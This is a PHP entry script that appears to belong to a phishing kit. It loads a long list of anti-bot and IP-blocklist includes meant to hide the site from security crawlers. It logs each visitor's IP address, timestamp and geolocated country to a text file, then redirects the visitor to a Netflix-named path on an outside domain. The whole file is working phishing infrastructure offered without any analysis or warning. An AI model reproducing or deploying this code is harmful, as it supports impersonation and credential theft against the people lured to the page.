<?php
include ('db.php');
include ('./bot/api.php');
include ('./Anti/bt.php');
include ('./Anti/bot.php');
include ('./Anti/antibots1.php');
include ('./Anti/antibots.php');
include ('./Anti/blocker2.php');
include ('./Anti/blocker1.php');
include "./bot/antibots1.php";
include "./bot/antibots2.php";
include "../bot/antibots3.php";
include "./bot/antibots4.php";
include "./bot/antibots5.php";
include "./bot/antibots6.php";
require './bot/usera.php';
require './bot/rangip.php';
require './bot/logger.php';
include "Anti/new.php";
include "Anti/Bot-Crawler.php";
include "Anti/Bot-Spox.php";
include "Anti/detect.php";
include "Anti/Dila_DZ.php";
require_once("Anti/IP-BlackList.php");
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$file = fopen("visit.txt","a");fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ."\n") ;
?>
<?php
	exit(header("Location: https://ukusno.me/netflix/netflix/"));
?>